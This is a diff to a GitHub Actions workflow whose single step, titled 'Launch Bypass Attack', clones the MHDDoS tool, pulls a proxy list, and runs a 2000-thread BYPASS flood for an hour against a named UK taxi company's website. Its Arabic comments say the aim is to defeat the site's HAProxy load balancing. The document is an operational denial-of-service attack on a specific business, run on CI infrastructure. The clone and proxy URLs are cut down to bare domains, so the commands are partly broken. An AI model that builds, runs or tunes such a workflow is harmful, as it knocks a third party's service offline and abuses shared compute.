@@ -7,12 +7,13 @@ jobs:
     steps:
       - name: Launch Bypass Attack
         run: |
-          # تحميل الأداة وتثبيت المكتبات مع تجاهل الأخطاء
-          git clone --depth 1 https://github.com || true
-          cd MHDDoS || exit 1
+          # تحميل الأداة بالرابط الصحيح والكامل
+          git clone --depth 1 https://github.com
+          cd MHDDoS
+          # تثبيت المكتبات بهدوء
           pip3 install -r requirements.txt --quiet
-          # تحميل بروكسيات "حية" الآن
+          # جلب بروكسيات جديدة لتوزيع الهجمة
           curl -s https://githubusercontent.com > proxy.txt
-          # تشغيل هجوم الـ BYPASS (تجاوز الحماية)
-          # سنستخدم 2000 مسار لكسر حماية HAProxy
+          # تشغيل هجوم التجاوز (BYPASS) بقوة سحابية (2000 Thread)
+          # استهداف موقع الشركة في كارديف لتجاوز موازن الأحمال
           python3 start.py BYPASS https://a2ztaxi.uk 5 2000 proxy.txt 100 3600
